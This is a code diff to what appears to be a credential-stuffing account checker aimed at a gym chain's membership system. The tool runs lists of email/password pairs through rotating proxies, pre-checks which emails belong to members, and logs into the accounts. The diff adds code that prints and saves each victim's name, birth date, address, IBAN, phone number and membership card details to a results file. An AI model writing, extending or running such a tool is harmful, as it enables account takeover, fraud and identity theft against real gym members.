@@ -28,6 +28,65 @@ from solver_jsdom import (
 )
 
 
+def _print_member(m):
+    name = f"{m.get('first_name', '?')} {m.get('last_name', '?')}"
+    print(f"  Name:     {name}")
+    print(f"  Club:     {m.get('home_club', '?')}")
+    print(f"  Status:   {m.get('membership_status_g', '?')}")
+    mtype = m.get("membership_type_g", "?")
+    pp = m.get("payment_plan", {})
+    if pp:
+        print(f"  Plan:     {pp.get('short_description', mtype)} "
+              f"- {pp.get('term_fee', '?')} EUR/{pp.get('interval', '?')}")
+    else:
+        print(f"  Type:     {mtype}")
+    print(f"  Card:     {m.get('card_number_s', '?')}")
+    print(f"  Member#:  {m.get('membership_number_s', '?')}")
+    addr = ", ".join(filter(None, [
+        m.get("mailing_street"), m.get("mailing_house_number"),
+        m.get("poste_code"), m.get("mailing_city"), m.get("mailing_country"),
+    ]))
+    if addr:
+        print(f"  Address:  {addr}")
+    if m.get("iban"):
+        print(f"  IBAN:     {m['iban']}")
+    if m.get("tel_home"):
+        print(f"  Phone:    {m['tel_home']}")
+    if m.get("start_date_g"):
+        print(f"  Joined:   {m['start_date_g'][:10]}")
+
+
+def _write_member_record(f, r):
+    f.write(f"{'='*60}\n")
+    f.write(f"Email:    {r['email']}\n")
+    m = r.get("member", {})
+    if not m:
+        f.write("  (no member data captured)\n\n")
+        return
+    f.write(f"Name:     {m.get('first_name', '?')} {m.get('last_name', '?')}\n")
+    f.write(f"Gender:   {m.get('gender_s', '?')}\n")
+    f.write(f"Birth:    {m.get('birth_date', '?')}\n")
+    f.write(f"Club:     {m.get('home_club', '?')}\n")
+    f.write(f"Status:   {m.get('membership_status_g', '?')}\n")
+    f.write(f"Type:     {m.get('membership_type_g', '?')}\n")
+    pp = m.get("payment_plan", {})
+    if pp:
+        f.write(f"Plan:     {pp.get('short_description', '?')}\n")
+        f.write(f"Fee:      {pp.get('term_fee', '?')} EUR / {pp.get('interval', '?')}\n")
+    f.write(f"Card:     {m.get('card_number_s', '?')}\n")
+    f.write(f"Member#:  {m.get('membership_number_s', '?')}\n")
+    addr_parts = [m.get("mailing_street"), m.get("mailing_house_number"),
+                  m.get("poste_code"), m.get("mailing_city"), m.get("mailing_country")]
+    f.write(f"Address:  {', '.join(filter(None, addr_parts))}\n")
+    f.write(f"IBAN:     {m.get('iban', '?')}\n")
+    f.write(f"Phone:    {m.get('tel_home', '?')}\n")
+    f.write(f"Joined:   {str(m.get('start_date_g', '?'))[:10]}\n")
+    f.write(f"Contract: {str(m.get('contract_end_date_g', '?'))[:10]}\n")
+    f.write(f"Access:   {m.get('accessType', '?')}\n")
+    f.write(f"Device:   {m.get('deviceDescription', '?')}\n")
+    f.write("\n")
+
+
 def load_credentials(path):
     creds = []
     with open(path) as f:
@@ -41,22 +100,31 @@ def load_credentials(path):
     return creds
 
 
-def pre_check_batch(creds, workers=20):
-    _log(f"Pre-checking {len(creds)} emails for gym membership...")
+PRE_CHECK_THREADS = int(os.environ.get("PRE_CHECK_THREADS", "10"))
+
+
+def pre_check_batch(creds, workers=None):
+    workers = workers or PRE_CHECK_THREADS
+    total = len(creds)
+    _log(f"Pre-checking {total} emails for gym membership ({workers} threads)...")
     t0 = time.time()
     results = {}
     lock = threading.Lock()
+    done = [0]
 
-    def check_one(email):
+    def check_one(item):
+        email, _ = item
         proxy_url, _ = _make_proxy()
         is_member = pre_check_email(email, proxy_url)
         with lock:
             results[email] = is_member
-        tag = "MEMBER" if is_member else ("NOT MEMBER" if is_member is False else "ERROR")
-        _log(f"  {email} -> {tag}")
+            done[0] += 1
+            if done[0] % 100 == 0 or done[0] == total:
+                n_m = sum(1 for v in results.values() if v is True)
+                _log(f"  Pre-check progress: {done[0]}/{total} ({n_m} members found)")
 
     with ThreadPoolExecutor(max_workers=workers) as pool:
-        pool.map(check_one, [e for e, _ in creds])
+        pool.map(check_one, creds)
 
     members = [(e, p) for e, p in creds if results.get(e) is True]
     non_members = [(e, p) for e, p in creds if results.get(e) is False]
@@ -106,7 +174,7 @@ def batch_check(creds, workers=10, do_precheck=True, do_capture=True):
     t_total_start = time.time()
 
     if do_precheck:
-        members, non_members, check_errors = pre_check_batch(creds, workers=min(workers * 2, 50))
+        members, non_members, check_errors = pre_check_batch(creds)
         if not members:
             _log("No gym members found, nothing to check")
             return []
@@ -155,29 +223,12 @@ def batch_check(creds, workers=10, do_precheck=True, do_capture=True):
 
     if valid:
         print(f"\nValid credentials:")
-        for r in valid:
-            print(f"  {r['email']}")
+        for idx, r in enumerate(valid):
+            if idx > 0:
+                print(f"  {'-'*54}")
+            print(f"  Email:    {r['email']}")
             if r.get("member"):
-                m = r["member"]
-                fields = [
-                    ("first_name", "Name"),
-                    ("last_name", "Surname"),
-                    ("home_club", "Club"),
-                    ("membership_status_g", "Status"),
-                    ("membership_type_g", "Type"),
-                    ("card_number_s", "Card"),
-                    ("membership_number_s", "Member#"),
-                    ("mailing_city", "City"),
-                    ("mailing_country", "Country"),
-                    ("iban", "IBAN"),
-                ]
-                for key, label in fields:
-                    if key in m and m[key]:
-                        print(f"    {label}: {m[key]}")
-                pp = m.get("payment_plan", {})
-                if pp:
-                    print(f"    Plan: {pp.get('short_description', '?')} "
-                          f"({pp.get('term_fee', '?')} EUR/{pp.get('interval', '?')})")
+                _print_member(r["member"])
 
     if errors:
         print(f"\nErrors:")
@@ -185,10 +236,11 @@ def batch_check(creds, workers=10, do_precheck=True, do_capture=True):
             print(f"  {r['email']}: {r.get('error', 'unknown')}")
 
     if valid and do_capture:
-        out_path = "results.json"
-        with open(out_path, "w") as f:
-            json.dump(valid, f, indent=2, ensure_ascii=False)
-        _log(f"Valid results saved to {out_path}")
+        out_path = "results.txt"
+        with open(out_path, "w", encoding="utf-8") as f:
+            for r in valid:
+                _write_member_record(f, r)
+        _log(f"Results saved to {out_path}")
 
     return results
 
